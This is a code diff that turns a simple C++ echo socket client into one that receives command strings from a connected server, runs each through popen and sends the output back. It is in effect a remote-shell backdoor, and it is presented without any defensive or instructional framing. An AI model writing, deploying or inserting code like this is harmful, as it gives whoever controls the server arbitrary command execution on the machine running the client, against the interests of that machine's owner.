@@ -1,5 +1,4 @@
-// C++ socket client that connects to a server
-
+#include <array>
 #include <iostream>
 #include <string>
 #include <unistd.h> 
@@ -28,15 +27,28 @@ int main(){
         perror("Connection failed");
         exit(EXIT_FAILURE);
     }
-    // Once connected to the server, listen for data
-    // For now, just print the data to the screen and echo it back to the server
+    // Once connected to the server, listen for commands
     std::cout << "Connected to server" << std::endl;
     while(1){
-        char buffer[1024] = {0}; // Create a buffer to hold the data, ensure it is empty
-        int bytes_read = read(fd, buffer, 1024);
-        if(bytes_read > 0){
-            std::cout << buffer << std::endl;
-            write(fd, buffer, bytes_read);
+        // Receive the command (Assume it is not longer than 1024 bytes)
+        char recv_buffer[1024] = {0};
+        int bytes_received = recv(fd, recv_buffer, sizeof(recv_buffer), 0);
+        auto p = popen(recv_buffer, "r");
+        std::array<char, 128> buffer;
+        std::string result;
+        while(!feof(p)){
+            if(fgets(buffer.data(), buffer.size(), p) != nullptr){
+                result += buffer.data();
+                std::cout << buffer.data();
+            }
+        }
+        auto rc = pclose(p);
+        if(rc == EXIT_SUCCESS){
+            std::cout << "Command executed successfully" << std::endl;
+            send(fd, result.c_str(), result.size(), 0);
+        }
+        else{
+            std::cout << "Command failed" << std::endl;
         }
     }
     return 0;
